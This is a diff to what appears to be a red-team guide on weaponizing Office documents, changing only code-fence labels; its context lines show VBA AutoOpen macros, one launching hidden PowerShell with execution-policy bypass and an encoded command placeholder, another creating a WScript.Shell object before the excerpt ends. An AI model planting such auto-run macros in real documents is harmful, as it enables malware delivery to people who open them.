@@ -167,7 +167,7 @@ Attacks > Packages > Payload Generator
 ### Office Document Weaponization
 
 - **VBA Macros**: Auto-executing code when document opens
-  ```vba
+  ```
   Sub AutoOpen()
       Dim exec As String
       exec = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc [BASE64]"
@@ -366,7 +366,7 @@ Attacks > Packages > Payload Generator
 
 ### Example: Document Macro Payload
 
-```vba
+```
 Sub AutoOpen()
     Dim wsh As Object
     Set wsh = CreateObject("WScript.Shell")
